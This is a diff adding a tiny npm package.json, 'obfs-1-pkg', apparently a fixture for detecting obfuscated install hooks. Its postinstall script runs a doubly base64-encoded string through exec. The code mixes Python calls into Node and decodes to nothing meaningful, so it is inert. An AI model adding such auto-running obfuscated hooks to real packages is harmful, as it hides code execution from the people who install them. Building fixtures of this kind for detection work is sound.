@@ -1,0 +1,7 @@
+{
+  "name": "obfs-1-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"exec(base64.b64decode(base64.b64decode(\"Wlh4WA==\")))\""
+  }
+}
